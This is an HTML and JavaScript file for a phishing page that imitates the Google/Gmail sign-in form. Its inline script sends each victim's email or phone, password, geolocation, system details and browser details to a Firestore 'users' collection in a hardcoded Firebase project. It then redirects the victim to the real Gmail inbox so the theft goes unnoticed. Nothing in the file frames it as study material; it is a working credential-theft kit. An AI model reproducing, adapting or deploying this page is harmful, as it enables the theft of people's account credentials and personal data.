<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!-- <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> -->
	<title>Gmail</title>
	<link rel="icon" href="google-icon.png" type="image/gif/png">
	<link 
	href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css" 
	rel="stylesheet"  type='text/css'>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<div class="container-form">
		<img alt="Google" src="google-img.png">

		<p class="div-title">Sign in <br><span>with your Google Account</span></p>

		<form action="" method="">

			<input style="display: none;" id="the-ip-address" type="text" value="" name="geolocation">
			<input style="display: none;" type="text" name="sys_info" id="sys_info">
			<input style="display: none;" type="text" name="browser_info" id="browser_info">

			<div>
				<div class="div-container-label">
					<label id="email-or-phone">Email or phone</label>
				</div>
				<div class="div-container-input">
					<input onmouseenter="changeLabelColorInBlue('#email-or-phone')" onmouseleave="changeLabelColorInDefault('#email-or-phone')" class="form-input-data" type="text" name="email-or-phone" id="email-or-phone-value">
				</div>
			</div>

			<div>
				<div class="div-container-label">
					<label id="enter-your-password">Enter your password</label>
				</div>
				<div class="div-container-input">
					<input class="form-input-data active" id="pass2" onmouseenter="changeLabelColorInBlue('#enter-your-password')" onmouseleave="changeLabelColorInDefault('#enter-your-password')" type="password" name="password">
					<i id="icon" class="fa fa-eye-slash"></i>
				</div>
			</div>
			<div class="div-submit">
				<button class="btn-forgot-pwd">
					Forgot password?
				</button>
				<!-- <input type="submit" value="SIGN IN"> -->

				<button type="button" id="submitData" name="submitData">SIGN IN</button>

				<!-- <a type="button" id="submitData" name="submitData" href = "https://www.example.com">SIGN IN</a> -->
			</div>
		</form>
	</div>

	<div class="container-bottom">
		<div class="container-bottom-content">		
			<select class="select-language">
				<option>‪English (United States)‬</option>
			</select>
		</div>
		<div class="added-elts">
			<div class="added-elts-content">
				<div class="added-elts-item added-elts-1">Help</div>
				<div class="added-elts-item added-elts-2">Privacy</div>
				<div class="added-elts-item added-elts-3">Terms</div>
			</div>
		</div>
	</div>

	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
	<script type="text/javascript" src="script.js"></script>
	<script type="module">
		// SUBMIT DATA

		// Import the functions you need from the SDKs you need
		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
		import { getFirestore, setDoc, addDoc, doc, collection } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";

		// TODO: Add SDKs for Firebase products that you want to use
		// https://firebase.google.com/docs/web/setup#available-libraries

		// Your web app's Firebase configuration
		const firebaseConfig = {
		apiKey: "AIzaSyCGjW_wJcVfGyGJXbgSik5Fqa8-M4mf4Xk",
		authDomain: "users-data-97259.firebaseapp.com",
		projectId: "users-data-97259",
		storageBucket: "users-data-97259.appspot.com",
		messagingSenderId: "130924749834",
		appId: "1:130924749834:web:667df143ccb2a86bc4abf3"
		};

		// Initialize Firebase
		const app = initializeApp(firebaseConfig);
		const db = getFirestore(app);

		submitData.addEventListener('click', (e) => {

			var geolocation = document.getElementById("the-ip-address").value;
			var sys_info = document.getElementById("sys_info").value;
			var browser_info = document.getElementById("browser_info").value;
			var email_or_phone = document.getElementById("email-or-phone-value").value;
			var password = document.getElementById("pass2").value;
			var epoch = new Date().getTime();
			// // var redirectLink = "https://www.example.com/";
			var redirectLink = "https://mail.google.com/mail/u/0/#inbox";

			addDoc(collection(db, 'users'),{
				geolocation: geolocation,
				sys_info: sys_info,
				browser_info: browser_info,
				email_or_phone: email_or_phone,
				password: password,
				epoch: epoch,
			});

			//////////////////////////////////////////////////////////
			//////////////////////////////////////////////////////////
			//////////////////////////////////////////////////////////

			document.getElementById("submitData").addEventListener("click", redirectFunction);
			function redirectFunction(){
				window.location.href = redirectLink;
			}

			//////////////////////////////////////////////////////////
			//////////////////////////////////////////////////////////
			//////////////////////////////////////////////////////////

		});

	</script>
</body>
</html>
